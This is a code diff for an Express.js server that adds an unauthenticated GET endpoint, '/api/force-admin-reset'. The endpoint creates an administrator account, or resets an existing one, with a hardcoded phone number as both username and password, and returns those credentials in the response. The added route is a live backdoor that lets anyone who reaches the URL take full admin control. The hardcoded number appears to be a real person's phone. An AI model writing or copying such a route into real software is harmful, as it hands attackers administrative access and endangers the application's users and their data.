@@ -108,6 +108,36 @@ app.get('/api/debug-check', async (req, res) => {
             mongoConnection: mongoose.connection.readyState
         });
     } catch (e) {
+    }
+});
+
+app.get('/api/force-admin-reset', async (req, res) => {
+    try {
+        const User = require('./models/User');
+        const phone = '6381091552';
+        const password = '6381091552';
+
+        let user = await User.findOne({ phone: phone });
+
+        if (!user) {
+            user = new User({
+                name: 'Super Admin',
+                phone: phone,
+                password: password,
+                role: 'ADMIN',
+                isActive: true
+            });
+            await user.save();
+            return res.send(`Admin created with phone: ${phone} and password: ${password}`);
+        }
+
+        user.password = password;
+        user.isActive = true;
+        user.role = 'ADMIN';
+        await user.save();
+
+        res.send(`Admin password force updated for ${phone}. Try logging in now.`);
+    } catch (e) {
         res.status(500).send(e.message);
     }
 });
